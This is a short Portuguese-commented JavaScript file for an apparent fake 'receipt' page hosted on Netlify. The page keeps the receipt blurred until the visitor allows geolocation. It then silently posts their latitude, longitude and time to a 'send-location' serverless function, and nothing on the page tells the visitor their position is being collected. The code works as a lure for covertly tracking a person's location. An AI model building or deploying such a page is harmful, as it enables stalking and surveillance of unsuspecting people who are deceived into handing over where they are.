// SCRIPT.JS FINAL (VERSÃO SEGURA CORRIGIDA PARA NETLIFY)
// Este script é executado no navegador do usuário.

window.onload = function () {
  const receiptContainer = document.querySelector(".receipt-container");
  const permissionOverlay = document.querySelector(".permission-overlay");

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(onSuccess, onError);
  } else {
    permissionOverlay.style.display = "flex";
    permissionOverlay.innerHTML = "<p>Seu navegador não suporta Geolocalização.</p>";
  }
};

async function onSuccess(position) {
  document.querySelector(".receipt-container").classList.remove("content-blurred");
  document.querySelector(".permission-overlay").style.display = "none";

  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  const horario = encodeURIComponent(new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }));

  // --- ESTA É A LINHA CORRIGIDA ---
  // O caminho correto para funções na Netlify começa com '/.netlify/functions/'
  const secureFunctionURL = '/.netlify/functions/send-location';

  try {
    const response = await fetch(secureFunctionURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ lat, lon, horario }),
    });

    if (!response.ok) {
      const errorData = await response.text(); // Pega mais detalhes do erro
      throw new Error(`A chamada para a função segura falhou. Status: ${response.status}. Resposta: ${errorData}`);
    }

    const result = await response.json();
    console.log("Resposta da função segura:", result.message);

  } catch (error) {
    console.error("Ocorreu um erro ao enviar os dados para a função segura:", error);
  }
}

function onError(error) {
  const permissionOverlay = document.querySelector(".permission-overlay");
  permissionOverlay.style.display = "flex";
  let message = "";
  switch (error.code) {
    case error.PERMISSION_DENIED:
      message = "Permissão de localização negada."; break;
    case error.POSITION_UNAVAILABLE:
      message = "Localização indisponível."; break;
    case error.TIMEOUT:
      message = "Tempo esgotado para obter localização."; break;
    default:
      message = "Erro desconhecido na geolocalização.";
  }
  permissionOverlay.innerHTML = `<p>${message}</p>`;
  console.error("Erro de Geolocalização:", error.message);
}